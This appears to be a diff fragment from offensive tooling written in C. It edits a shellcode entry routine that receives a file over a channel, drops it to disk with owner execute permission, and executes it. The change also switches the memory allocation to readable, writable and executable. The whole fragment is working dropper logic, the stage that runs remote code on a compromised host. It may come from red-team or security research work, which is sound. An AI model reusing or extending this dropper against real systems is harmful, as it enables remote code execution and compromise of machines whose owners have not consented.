@@ -18,13 +18,13 @@ SHELLCODE_ENTRY {
     channel_recv(chan, &file_sz, sizeof(file_sz));
     
     /* Read the file data. */
-    file_contents = _malloc(file_sz);
+    file_contents = allocate_memory(file_sz, PROT_READ|PROT_WRITE|PROT_EXEC);
     channel_recv(chan, file_contents, file_sz);
 
     /* Drop executable file. */
-    drop_file(file_path, S_IRUSR | S_IWUSR | S_IXUSR, file_contents, file_sz); 
+    drop_file(file_path, S_IRUSR|S_IWUSR|S_IXUSR, file_contents, file_sz); 
 
-    char *const argv[] = { "/tmp/bash", NULL };
+    char *const argv[] = { NULL };
     char *const envp[] = { NULL };
 
     /* Execute the dropped executable. */
